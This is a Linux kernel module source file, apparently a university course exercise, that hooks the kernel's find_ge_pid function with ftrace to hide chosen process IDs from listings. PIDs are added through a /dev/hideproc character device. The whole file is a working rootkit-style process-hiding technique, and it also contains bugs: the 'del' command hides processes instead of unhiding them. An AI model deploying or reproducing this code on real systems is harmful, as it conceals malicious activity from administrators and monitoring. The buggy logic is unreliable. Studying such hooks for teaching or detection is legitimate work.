#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/livepatch.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

static struct klp_func funcs[] = {
	{
		.old_name = "kallsyms_lookup_name",
		.new_func = kallsyms_lookup_name,
	}, {}
};

static struct klp_func failfuncs[] = {
	{
		.old_name = "___________________",
	}, {}
};

static struct klp_object objs[] = {
	{
		.funcs = funcs,
	},
	{
		.name = "kallsyms_failing_name",
		.funcs = failfuncs,
	}, { }
};

static struct klp_patch patch = {
	.mod = THIS_MODULE,
	.objs = objs,
};

unsigned long kallsyms_lookup_name(const char *name)
{
	return ((unsigned long(*)(const char *))funcs->old_func)(name);
}

int init_kallsyms(void)
{
	int r = klp_enable_patch(&patch);

	if (!r)
		return -1;

	return 0;
}

struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    /* lookup address for the symbol */
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->orig) = hook->address;
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs)
{
    /* get struct ftrace_hook from member ops */
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    /**
     * SAVE_REGS: The ftrace_ops wants regs saved at each function called and passed to the callback.
     * RECURSION_SAFE : The ftrace_ops can set this to tell the ftrace infrastructure
     *                  that the call back has its own recursion protection.
     * IPMODIFY - The ops can modify the IP register.
     *            This can only be set with SAVE_REGS.
     **/
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                      FTRACE_OPS_FL_IPMODIFY;

    /* set a function to filter on in ftrace by address */
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    /* register a function for profiling */
    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        /* remove ip from filter */
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}

typedef struct {
    pid_t id;
    struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    // AAA (proc, tmp_proc, &hidden_proc, list_node) {
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        if (proc->id == pid)
            return true;
    }
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    /* First we get the orig return pid from find_ge_pid() */
    struct pid *pid = real_find_ge_pid(nr, ns);
    /* Next we check whether the pid is in hidden_proc list,
        if it is, return pid greater than or equal nr+1 and
        not hidden instead of return the pid of hidden proc. */
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    if (init_kallsyms() != 0)
        return;
    real_find_ge_pid = kallsyms_lookup_name("find_ge_pid");
    printk(KERN_INFO "find_ge_pid: %lx\n", real_find_ge_pid);
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid; /* hook function */
    hook.orig = &real_find_ge_pid; /* real function */
    hook_install(&hook);
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    // CCC;
    list_add_tail(&proc->list_node, &hidden_proc); /* add a new node to tail of list_head */
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *proc, *tmp_proc;
    // BBB (proc, tmp_proc, &hidden_proc, list_node) {
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        // DDD;
        list_del(&proc->list_node);
        kfree(proc);
    }
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

/* called when user read something from device */
static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    /* copy all proc pid of hidden procs to user */
    list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

/* called when user write something into device */
static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;

    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);

    if (!memcmp(message, add_message, sizeof(add_message) - 1)) { /* add <pid> */
        char *pid_list = message + sizeof(add_message);
        char **ptr = &pid_list;
        char *cur;

        while ((cur = strsep(ptr, " ")) != NULL) {
            if (!strlen(cur))
                continue;
            kstrtol(cur, 10, &pid);
            printk(KERN_INFO "[add] get pid: %ld\n", pid);
            hide_process(pid);
        }
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) { /* del <pid> */
        char *pid_list = message + sizeof(del_message);
        char **ptr = &pid_list;
        char *cur;

        while ((cur = strsep(ptr, " ")) != NULL) {
            if (!strlen(cur))
                continue;
            kstrtol(cur, 10, &pid);
            printk(KERN_INFO "[del] get pid: %ld\n", pid);
            hide_process(pid);
        }
    } else {
        kfree(message);
        return -EAGAIN;
    }

    *offset = len;
    kfree(message);
    return len;
}

static dev_t dev;
static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void) /* init_function */
{
    int err, dev_major;
    printk(KERN_INFO "Init @ %s\n", __func__);

    /* alloc_chrdev_region - register a range of char device numbers */
    /* dev will get dynamical device id */
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev); /* get device major */

    /* create a struct class structure */
    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME); /* (owner, name) */

    cdev_init(&cdev, &fops); /* initialize a cdev structure */
    /* MKDEV(ma,mi) - get device */
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1); /* add a char device to the system */

    /* creates a device and registers it with sysfs */
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);

    init_hook(); /* use ftrace_hook to hook function find_ge_pid */

    return 0;
}

/**
 * _hideproc_exit() - reset ftrace hook and clear device
 */
static void _hideproc_exit(void)
{
    printk(KERN_INFO "@ %s\n", __func__);
    hook_remove(&hook); /* remove ftrace hook */
    /* removes a device that was created with device_create() */
    device_destroy(hideproc_class, MKDEV(MAJOR(dev), MINOR_VERSION));
    cdev_del(&cdev); /* remove a cdev from the system */;
    class_destroy(hideproc_class); /* destroys a struct class structure */
    /* unregister a range of device numbers */
    unregister_chrdev_region(&dev, MINOR_VERSION);
}

module_init(_hideproc_init); /* set function _hideproc_init as init_function */
module_exit(_hideproc_exit); /* set function _hideproc_exit as exit_function */
MODULE_INFO(livepatch, "Y");